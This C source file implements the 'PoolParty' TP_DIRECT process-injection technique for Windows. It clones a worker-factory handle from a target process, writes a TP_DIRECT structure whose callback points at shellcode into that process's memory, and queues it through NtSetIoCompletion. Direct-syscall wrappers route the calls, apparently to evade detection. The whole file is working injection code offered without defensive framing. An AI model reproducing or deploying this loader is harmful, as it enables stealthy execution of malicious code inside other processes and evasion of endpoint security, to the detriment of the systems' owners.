/*
    Technique: PoolParty IO - TP_DIRECT
*/

#include <windows.h>
#include <unwin.h>

#include <stdio.h>

#include <ThreadPool.h>

#include "injection.h"
#include "../syscalls/syscalls.h"

extern Ade GlobalAde;

static NTSTATUS status;

HANDLE DuplicateHandleK(HANDLE hproc, int pPid, int handleType) {
    HANDLE handleDuplicated;
    ULONG return_sz = 0;
    PSYSTEM_HANDLE_INFORMATION_EX handle_table = malloc(0);
    
    // [ Get System Handles ]
    do {
        handle_table = realloc(handle_table, return_sz);
        status = NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            handle_table,
            return_sz,
            &return_sz
        );
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    // [ Clone the handle ]
    for (int i = 0; i < handle_table->NumberOfHandles; i++) {
        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = malloc(0);
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle_info = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)handle_table->Handles[i];

        if (
            handle_info.UniqueProcessId == pPid &&
            (HANDLE)handle_info.HandleValue != INVALID_HANDLE_VALUE &&
            handle_info.ObjectTypeIndex == handleType
        ) {
            if (!DuplicateHandle(
                hproc,
                (HANDLE)handle_info.HandleValue,
                GetCurrentProcess(),
                &handleDuplicated,
                WORKER_FACTORY_ALL_ACCESS,
                FALSE,
                0
            )) {
#ifdef DEBUG
                    printf("ERROR: DuplicateHandle (0x%x)\n", GetLastError());
#endif
                return NULL;
            }

            break;
        }
    }

    return handleDuplicated;
}

int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellcode) {
    TP_DIRECT tpDirect = { 0 };
    tpDirect.Callback = ptrShellcode;
    AdeSinner sinner;

    // [ Create the remote TpDirect ]
    PTP_DIRECT remoteTpDirect = NULL;
    SIZE_T AllocSize = sizeof(TP_DIRECT);
    CallAde(sinner, "NtAllocateVirtualMemory", NTSTATUS status,
        targetProcHandle,
        (PVOID)&remoteTpDirect,
        0,
        &AllocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remoteTpDirect == NULL || status != 0x0) {
#ifdef DEBUG
        printf("Invalid Allocation: 0x%x\n", status);
#endif
        return -1;
    }

    // [ Write local TpDirect to the remoteTpDirect ]
    CallAde(sinner, "NtWriteVirtualMemory", status,
        targetProcHandle,
        remoteTpDirect,
        &tpDirect,
        sizeof(TP_DIRECT),
        NULL
    );

    if (status != 0x0) {
#ifdef DEBUG
        printf("WriteProcessMemory ERROR: 0x%x\n", GetLastError());
#endif
        return -1;
    }

    //
    // Connect TpDirect to the completionIo (queue)
    //
    CallAde(sinner, "NtSetIoCompletion", status,
        completionIoHandle,
        remoteTpDirect,
        0,
        0,
        0
    );

    if (status != 0x0) {
#ifdef DEBUG
        printf("NtSetIoCompletion ERROR: 0x%x\n", status);
#endif
        return -1;
    }

    return 0;
}
